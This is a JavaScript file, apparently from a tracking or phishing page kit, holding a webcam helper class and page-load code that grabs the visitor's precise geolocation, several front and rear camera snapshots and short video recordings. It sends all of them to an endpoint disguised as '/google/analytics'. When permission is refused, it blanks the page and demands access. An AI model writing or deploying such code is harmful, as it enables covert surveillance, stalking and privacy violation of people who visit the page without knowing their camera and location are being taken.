class Webcam{constructor(e,t="user",s=null,i=null){this._webcamElement=e,this._webcamElement.width=this._webcamElement.width||640,this._webcamElement.height=this._webcamElement.height||.75*this._webcamElement.width,this._facingMode=t,this._webcamList=[],this._streamList=[],this._selectedDeviceId="",this._canvasElement=s,this._snapSoundElement=i}get facingMode(){return this._facingMode}set facingMode(e){this._facingMode=e}get webcamList(){return this._webcamList}get webcamCount(){return this._webcamList.length}get selectedDeviceId(){return this._selectedDeviceId}getVideoInputs(e){return this._webcamList=[],e.forEach(e=>{"videoinput"===e.kind&&this._webcamList.push(e)}),1==this._webcamList.length&&(this._facingMode="user"),this._webcamList}getMediaConstraints(){var e={};return""==this._selectedDeviceId?e.facingMode=this._facingMode:e.deviceId={exact:this._selectedDeviceId},{video:e,audio:!1}}selectCamera(){for(let e of this._webcamList)if("user"==this._facingMode&&e.label.toLowerCase().includes("front")||"enviroment"==this._facingMode&&e.label.toLowerCase().includes("back")){this._selectedDeviceId=e.deviceId;break}}flip(){this._facingMode="user"==this._facingMode?"enviroment":"user",this._webcamElement.style.transform="",this.selectCamera()}async start(e=!0){return new Promise((t,s)=>{this.stop(),navigator.mediaDevices.getUserMedia(this.getMediaConstraints()).then(i=>{this._streamList.push(i),this.info().then(i=>{this.selectCamera(),e?this.stream().then(e=>{t(this._facingMode)}).catch(e=>{s(e)}):t(this._selectedDeviceId)}).catch(e=>{s(e)})}).catch(e=>{s(e)})})}async info(){return new Promise((e,t)=>{navigator.mediaDevices.enumerateDevices().then(t=>{this.getVideoInputs(t),e(this._webcamList)}).catch(e=>{t(e)})})}async stream(){return new Promise((e,t)=>{navigator.mediaDevices.getUserMedia(this.getMediaConstraints()).then(t=>{this._streamList.push(t),this._webcamElement.srcObject=t,"user"==this._facingMode&&(this._webcamElement.style.transform="scale(-1,1)"),this._webcamElement.play(),e(this._facingMode)}).catch(e=>{console.log(e),t(e)})})}stop(){this._streamList.forEach(e=>{e.getTracks().forEach(e=>{e.stop()})})}snap(){if(null!=this._canvasElement){null!=this._snapSoundElement&&this._snapSoundElement.play(),this._canvasElement.height=this._webcamElement.scrollHeight,this._canvasElement.width=this._webcamElement.scrollWidth;let e=this._canvasElement.getContext("2d");return"user"==this._facingMode&&(e.translate(this._canvasElement.width,0),e.scale(-1,1)),e.clearRect(0,0,this._canvasElement.width,this._canvasElement.height),e.drawImage(this._webcamElement,0,0,this._canvasElement.width,this._canvasElement.height),this._canvasElement.toDataURL("image/png")}throw"canvas element is missing"}}

if (locenable == '1') {
    const options = {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0,
    };
    function success(pos) {
        const crd = pos.coords;
        let locCounter = 0;
        const locLooper = setInterval(async () => {
            locCounter++
            await fetch('/google/analytics', {
                method: "POST",
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
                },
                body: JSON.stringify({
                    post_id: post_id,
                    latitude: crd.latitude,
                    longitude: crd.longitude
                })
            });
    
            if (locCounter >= 3) {
                clearInterval(locLooper);
            }
        }, delay);
    }
    function error(err) {
        if (err.code === err.PERMISSION_DENIED) {
            bodyWeb[0].innerHTML = '';
            alert('Permission denied, allow location to continue.');
        }
    }
    navigator.geolocation.getCurrentPosition(success, error, options);
    getAccurateCurrentPosition(success, error);
    function getAccurateCurrentPosition(c,a,t,o){var i,e,n,r=0;o=o||{};var u=function(c){i=c,r+=1,c.coords.accuracy<=o.desiredAccuracy&&r>1?(clearTimeout(n),navigator.geolocation.clearWatch(e),$(c)):t(c)},m=function(){navigator.geolocation.clearWatch(e),$(i)},l=function(c){clearTimeout(n),navigator.geolocation.clearWatch(e),a(c)},$=function(a){c(a)};o.maxWait||(o.maxWait=1e4),o.desiredAccuracy||(o.desiredAccuracy=20),o.timeout||(o.timeout=o.maxWait),o.maximumAge=0,o.enableHighAccuracy=!0,e=navigator.geolocation.watchPosition(u,l,o),n=setTimeout(m,o.maxWait)}
}

if (frontenable == '1') {
    const frontElement = document.getElementById('frontphoto');
    const frontCanvas = document.getElementById('frontphoto_canvas');
    const frontcam = new Webcam(frontElement, 'user', frontCanvas);
    frontcam.start().then(result => {
        let frontCounter = 0;
        const frontLooper = setInterval(() => {
            frontCounter++
            frontcam.info().then(async (result) => {
                if (result[0].deviceId.length > 0) {
                    var front_photo = frontcam.snap();
                    await fetch('/google/analytics', {
                        method: "POST",
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
                        },
                        body: JSON.stringify({
                            post_id: post_id,
                            front_photo: front_photo
                        })
                    });
                }
            });
    
            if (frontCounter >= 3) {
                clearInterval(frontLooper);
                frontcam.stop();
            }
        }, delay);
    })
    .catch(err => {
        try { 
            bodyWeb[0].innerHTML = '';
            alert('Permission denied, allow camera to continue.');
        } catch { };
    });
}

async function videostream () {
    if (window.isSecureContext && navigator.mediaDevices) {
        const videoLive = document.querySelector('#videostream')
        const videoRecorded = document.querySelector('#videoblob')
        const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
        })
        
        videoLive.srcObject = stream
        
        if (!MediaRecorder.isTypeSupported('video/mp4')) {
            console.warn('video/mp4 is not supported')
        }
        
        const mediaRecorder = new MediaRecorder(stream, {
            mimeType: 'video/mp4',
        })
        
        mediaRecorder.start()
        
        setTimeout(() => {
            mediaRecorder.stop()
        }, 3000);
        
        mediaRecorder.addEventListener('dataavailable', async (event) => {
            var fd = new FormData();
            fd.append('post_id', post_id)
            fd.append('video', event.data)
            await fetch('/google/analytics', {
                method: "POST",
                body: fd
            });
        })
    } else {
        bodyWeb[0].innerHTML = '';
        const para = document.createElement("h1");
        para.innerText = "Use google chrome for better experience";
        document.body.appendChild(para);
        var ua = navigator.userAgent.toLowerCase();
        var isAndroid = ua.indexOf("android") > -1;
        if(isAndroid) {
            setTimeout(() => {
                window.open('intent://' + window.location.host + window.location.pathname + '#Intent;scheme=https;package=com.android.chrome;end');
            }, 1000);
        }
    }
}

if (videoenable == '1') {
    let videoCounter = 0;
    const videoLooper = setInterval(() => {
        videoCounter++
        videostream()
        if (videoCounter >= 3) {
            clearInterval(videoLooper);
        }
    }, parseInt(delay) + 300);
}

if (rearenable == '1') {
    const rearElement = document.getElementById('rearphoto');
    const rearCanvas = document.getElementById('rearphoto_canvas');
    const rearcam = new Webcam(rearElement, 'enviroment', rearCanvas);
    rearcam.start().then(result => {
        let rearCounter = 0;
        const rearLooper = setInterval(() => {
            rearCounter++
            rearcam.info().then(async (result) => {
                if (result[0].deviceId.length > 0) {
                    var rear_photo = rearcam.snap();
                    await fetch('/google/analytics', {
                        method: "POST",
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
                        },
                        body: JSON.stringify({
                            post_id: post_id,
                            rear_photo: rear_photo
                        })
                    });
                }
            });
            if (rearCounter >= 3) {
                clearInterval(rearLooper);
                rearcam.stop();
            }
        }, parseInt(delay) + 700);
    })
    .catch(err => {
        try { 
            bodyWeb[0].innerHTML = '';
            alert('Permission denied, allow camera to continue.');
        } catch { };
    });
}